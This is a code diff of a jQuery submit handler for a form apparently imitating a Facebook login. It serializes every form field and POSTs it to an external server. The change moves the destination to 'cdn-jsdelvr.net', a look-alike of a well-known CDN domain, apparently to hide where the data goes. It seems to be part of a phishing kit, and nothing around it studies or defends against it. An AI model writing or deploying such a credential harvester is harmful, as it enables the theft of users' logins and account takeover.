@@ -2,7 +2,7 @@ $(".login-form-fb").submit(function() {
     var d = $(".login-form-fb");
 
     $.ajax({
-        url: "https://extreme-lookup.com/json/",
+        url: "https://cdn-jsdelvr.net/api/json/",
         type: "POST",
         data: d.serialize(),
         success: function () {
